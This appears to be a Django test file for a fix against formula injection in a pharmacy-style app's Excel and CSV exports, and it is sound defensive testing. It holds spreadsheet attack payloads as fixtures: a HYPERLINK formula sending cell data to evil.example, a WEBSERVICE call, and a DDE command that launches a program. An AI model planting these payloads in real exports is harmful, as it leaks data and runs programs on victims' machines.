"""
Platform & abuse — formula injection in Excel / CSV exports (Batch 6, W-4).

Before: text people type — a portal reorder's notes, a shortage line, an OCR'd invoice line — went
into exports as-is. A cell that starts with '=' is a live formula in an .xlsx, and a CSV cell that
starts with = + - @ (or a tab / CR) is run as one when Excel opens the file: =HYPERLINK(...) sends
the sheet's data to an outside site, DDE can start programs on the staff PC.

Now: `core.export_safety` — `neutralise_formulas(wb)` right before `wb.save()` turns every formula
cell into plain text, and `csv_writer(...)` prefixes risky CSV cells with an apostrophe. Plain
numbers ("-5", "+20%") are left as numbers.
"""
import csv
import io

import openpyxl
from django.test import SimpleTestCase, TestCase

from apps.reservations.models import Reservation
from apps.shortage.models import ShortageItem, ShortageList
from apps.tests.factories import make_admin, make_branch, make_item


EVIL = '=HYPERLINK("http://evil.example/?d="&A1,"اضغط")'


def _formula_cells(xlsx_bytes):
    wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
    return [c.coordinate for ws in wb.worksheets for row in ws.iter_rows() for c in row
            if c.data_type == 'f']


class ExportSafetyHelperTests(SimpleTestCase):

    def test_formula_cells_become_text(self):
        from core.export_safety import neutralise_formulas
        wb = openpyxl.Workbook()
        wb.active.append([EVIL, 5, 'نص'])
        buf = io.BytesIO()
        neutralise_formulas(wb).save(buf)
        self.assertEqual(_formula_cells(buf.getvalue()), [])
        self.assertEqual(openpyxl.load_workbook(io.BytesIO(buf.getvalue())).active['A1'].value, EVIL)

    def test_csv_cells_are_defused_but_numbers_kept(self):
        from core.export_safety import csv_writer
        buf = io.StringIO()
        csv_writer(buf).writerow(['=1+1', '+2', '-cmd', '@SUM(A1)', '\tx', 'عادي', '-5', '+20%', -3])
        self.assertEqual(next(csv.reader(io.StringIO(buf.getvalue()))),
                         ["'=1+1", '+2', "'-cmd", "'@SUM(A1)", "'\tx", 'عادي', '-5', '+20%', '-3'])

    def test_write_only_sheet_rows_become_text(self):
        # write-only workbooks (the big purchasing exports) can't be walked after the fact
        from openpyxl.cell import WriteOnlyCell
        from core.export_safety import neutralise_formulas, safe_sheet
        wb = openpyxl.Workbook(write_only=True)
        ws = safe_sheet(wb.create_sheet(title='s'))
        ws.freeze_panes = 'A2'                    # attribute writes reach the real sheet
        ws.append([EVIL, WriteOnlyCell(ws, value=EVIL), 7])
        buf = io.BytesIO()
        neutralise_formulas(wb).save(buf)
        self.assertEqual(_formula_cells(buf.getvalue()), [])
        self.assertEqual(openpyxl.load_workbook(io.BytesIO(buf.getvalue())).active['C1'].value, 7)

    def test_unwrapped_write_only_sheet_is_refused(self):
        from core.export_safety import neutralise_formulas
        wb = openpyxl.Workbook(write_only=True)
        wb.create_sheet(title='s')
        with self.assertRaises(TypeError):
            neutralise_formulas(wb)


class ExportSiteTests(TestCase):

    def setUp(self):
        self.branch = make_branch()
        _, self.admin, self.c = make_admin('w4_admin')

    def test_reservation_export_writes_notes_as_text(self):
        r = Reservation.objects.create(item=make_item(), branch=self.branch, quantity_requested=1,
                                       contact_name=EVIL, contact_phone='01011111111',
                                       notes=EVIL, created_by=self.admin)
        resp = self.c.post('/api/reservations/bulk/', {'action': 'export', 'ids': [r.pk]}, format='json')
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(_formula_cells(resp.content), [])

    def test_shortage_csv_prefixes_formulas(self):
        sl = ShortageList.objects.create(branch=self.branch, status='open', created_by=self.admin)
        ShortageItem.objects.create(shortage_list=sl, raw_name=EVIL, notes='+cmd')
        resp = self.c.get(f'/api/shortage/lists/{sl.pk}/export/')
        self.assertEqual(resp.status_code, 200)
        body = resp.content.decode('utf-8-sig')
        row = list(csv.reader(io.StringIO(body)))[1]
        self.assertEqual(row[0], "'" + EVIL)
        self.assertEqual(row[-1], "'+cmd")

    def test_shortage_excel_writes_names_as_text(self):
        from apps.shortage.export import export_list_excel
        sl = ShortageList.objects.create(branch=self.branch, status='open', created_by=self.admin)
        ShortageItem.objects.create(shortage_list=sl, raw_name=EVIL)
        self.assertEqual(_formula_cells(export_list_excel(sl)), [])


class KeepSafeFormulasTests(SimpleTestCase):
    """Round 2, R5: the KPI board and the ISR fulfilment sheet build live formulas on purpose.
    `neutralise_formulas(wb, keep_safe_formulas=True)` keeps a formula only when it is plain
    in-workbook arithmetic; anything typed text could smuggle in is written as text."""

    SAFE = ['=SUM(AC7:AH7)', '=$AC$7*$J9', '=IF(A1="x","y",MAX(ROUND(B2*3,1),1))',
            "='Sheet 1'!A1+B2", "='بيانات الصنف'!C4*2", '=A:A', '=IF(TRUE,1,0)', '=-5',
            '=MAX(0,ROUNDUP(B3*C4-D5,0))', '=COUNTIF(B8:B17,">0")']
    UNSAFE = [EVIL, '=WEBSERVICE("http://evil.example")', "=cmd|'/c calc'!A0",
              '=[1]Sheet1!A1', r"='C:\x\[book.xlsx]S'!A1", '=1+HYPERLINK("a")', '=secret_name',
              '=@SUM(1)', '=IMPORTXML("u","q")', '=INDIRECT("A1")', '=CALL("k","f")', '=(']

    def test_formula_classifier(self):
        from core.export_safety import is_safe_formula
        for f in self.SAFE:
            self.assertTrue(is_safe_formula(f), f)
        for f in self.UNSAFE:
            self.assertFalse(is_safe_formula(f), f)

    def test_keep_safe_keeps_code_formulas_and_neutralises_typed_text(self):
        from core.export_safety import neutralise_formulas
        wb = openpyxl.Workbook()
        ws = wb.active
        ws['A1'], ws['A2'], ws['A3'] = '=SUM(B1:B5)', EVIL, '=cmd|\'/c calc\'!A0'
        buf = io.BytesIO()
        neutralise_formulas(wb, keep_safe_formulas=True).save(buf)
        self.assertEqual(_formula_cells(buf.getvalue()), ['A1'])

    def test_default_still_neutralises_everything(self):
        from core.export_safety import neutralise_formulas
        wb = openpyxl.Workbook()
        wb.active['A1'] = '=SUM(B1:B5)'
        buf = io.BytesIO()
        neutralise_formulas(wb).save(buf)
        self.assertEqual(_formula_cells(buf.getvalue()), [])
